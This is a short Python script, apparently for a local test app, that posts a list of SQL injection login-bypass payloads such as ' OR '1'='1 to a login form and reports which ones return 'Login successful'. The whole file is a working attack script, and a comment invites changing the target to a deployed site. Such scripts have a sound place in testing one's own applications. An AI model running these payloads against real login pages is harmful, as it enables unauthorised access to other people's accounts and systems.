import requests

target_url = "http://127.0.0.1:5000/"  # Change this if deployed elsewhere
payloads = ["' OR '1'='1", "' OR 'x'='x", "'; --", "' OR 1=1 --", "' OR '1'='1' --"]

for payload in payloads:
    data = {"username": payload, "password": "any"}
    response = requests.post(target_url, data=data)

    if "Login successful" in response.text:
        print(f"[!] SQL Injection Successful with payload: {payload}")
    else:
        print(f"[ ] Payload blocked: {payload}")
